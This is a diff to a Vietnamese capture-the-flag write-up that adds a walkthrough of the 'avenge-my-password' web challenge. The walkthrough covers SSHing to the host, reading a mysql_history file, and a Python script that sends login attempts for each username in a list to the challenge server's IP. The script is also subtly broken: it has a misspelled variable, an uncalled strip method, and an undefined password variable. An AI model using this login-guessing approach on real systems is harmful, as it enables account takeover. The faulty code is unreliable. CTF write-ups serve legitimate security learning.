@@ -190,11 +190,43 @@ Load lại trang là có flag:
 
 > Flag: Flag: jctf{who_said_you_could_open_the_cookie_jar!?}
 
+## [8. avenge-my-password](http://159.203.191.48/)
+
+
+![image](https://user-images.githubusercontent.com/104350480/232690800-6374c3a3-2567-420a-b7b9-965852b88593.png)
+
+Ta truy cập đường dẫn và nhập thử: 
+
+![image](https://user-images.githubusercontent.com/104350480/232692157-49ef18a5-3363-4683-a5db-9b6703ee0395.png)
+
+Đề bài cho phép ta kết nối ssh sang máy chủ của họ: 
+
+![image](https://user-images.githubusercontent.com/104350480/232692416-be1cf6fb-f059-4da2-9bc7-0a796d023b2b.png)
+
+Check thử ls -lsa, có mysql_history, ta cat thử xem file có gì: 
+
+![image](https://user-images.githubusercontent.com/104350480/232692554-dde91d94-4d2e-4571-b5a5-9409c47ed756.png)
+
+Có vẻ là dữ liệu liên quan đến trang web đăng nhập ở trên, giờ ta truy cập thử vào mysql của hệ thống xem có gì: 
 
 
 
+```
 
-Bài gợi ý cho ta hướng đi luôn từ đầu:
+import requests
+usernames = open("./username.txt","r").readlines()
+usernames = [a.strip() for a in unsernames if a.strip != ""]
+print(usernames)
+
+for username in usernames:
+    print(f"{username}=")
+    r = requests.post("http://159.203.191.48/", data = {"username":username, "password":password, "submit":"Login"})
+    if "Invalid" not in r.text:
+        print(r.text)
+        break
+
+```
+
 
 
 
